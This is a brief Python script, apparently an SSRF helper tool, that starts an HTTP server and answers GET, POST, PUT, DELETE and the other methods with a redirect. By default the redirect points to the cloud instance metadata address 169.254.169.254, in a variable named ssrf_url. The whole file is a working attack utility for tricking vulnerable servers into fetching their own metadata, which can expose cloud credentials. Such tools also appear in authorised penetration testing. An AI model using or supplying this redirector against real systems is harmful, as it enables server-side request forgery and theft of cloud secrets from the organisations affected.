#!/usr/bin/env python
#
#
# Redirector by @random_robbie
#
import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://169.254.169.254/latest/meta-data/",help="url to redirect to")
parser.add_argument("-c", "--code", required=False ,default="302",help="HTTP Status Code")
parser.add_argument("-p", "--port", required=False ,default="5555",help="Port to listen to")
args = parser.parse_args()
ssrf_url = args.url
code = int(args.code)
port = int(args.port)

from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()
   def do_HEAD(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()
   def do_POST(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()
   def do_PUT(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()
   def do_DELETE(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()  
   def do_PATCH(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()  
   def do_OPTIONS(self):
       self.send_response(code)
       self.send_header('Location', ssrf_url)
       self.end_headers()
    
try:
	HTTPServer(("", port), Redirect).serve_forever()
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
